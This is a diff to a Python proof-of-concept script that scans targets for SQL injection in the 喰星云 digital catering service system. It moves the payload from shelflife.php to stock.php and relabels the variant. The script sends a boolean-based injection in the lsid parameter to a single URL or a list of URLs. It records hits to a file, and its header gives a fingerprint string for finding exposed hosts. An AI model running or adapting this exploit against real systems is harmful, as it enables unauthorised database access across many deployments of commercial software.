@@ -1,4 +1,4 @@
-# 喰星云·数字化餐饮服务系统 多处 SQL注入漏洞[2]
+# 喰星云·数字化餐饮服务系统 多处 SQL注入漏洞[4]
 # body="tmp_md5_pwd"
 
 import requests,argparse,sys
@@ -14,13 +14,13 @@ def denner():
 ███████║██╔╝ ██╗   ██║        ███████║╚██████╔╝███████╗
 ╚══════╝╚═╝  ╚═╝   ╚═╝        ╚══════╝ ╚══▀▀═╝ ╚══════╝                                    
                             --author:Kucei
-                            --Version:喰星云·数字化餐饮服务系统 多处 SQL注入漏洞 [2]                        
+                            --Version:喰星云·数字化餐饮服务系统 多处 SQL注入漏洞[4]                        
 """
     print(test)
 
 def main():
     denner()
-    parser = argparse.ArgumentParser(description="喰星云·数字化餐饮服务系统 多处 SQL注入漏洞 [2]")
+    parser = argparse.ArgumentParser(description="喰星云·数字化餐饮服务系统 多处 SQL注入漏洞[4]")
     parser.add_argument('-u','--url',dest='url',type=str,help="Please Input URL")
     parser.add_argument('-f','--file',dest='file',type=str,help="Please Input File")
     args = parser.parse_args()
@@ -41,7 +41,7 @@ def main():
         print(f"Usag:\n\t python3 {sys.argv[0]} -h")
 
 def poc(target):
-    url_payload = '/logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29'
+    url_payload = '/logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29'
     headers = {
         'Upgrade-Insecure-Requests': '1',
         'Priority':'u=0, i',
@@ -55,7 +55,7 @@ def poc(target):
         response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=5)
         # print(response.text)
         if response.status_code == 200 and 'success' in response.text:
-            print( f"[+] {target} 存在漏洞！\n[+] ")
+            print( f"[+] {target} 存在漏洞！ ")
             with open('result.txt','a',encoding='utf-8')as f:
                 f.write(target+url_payload)
                 return True
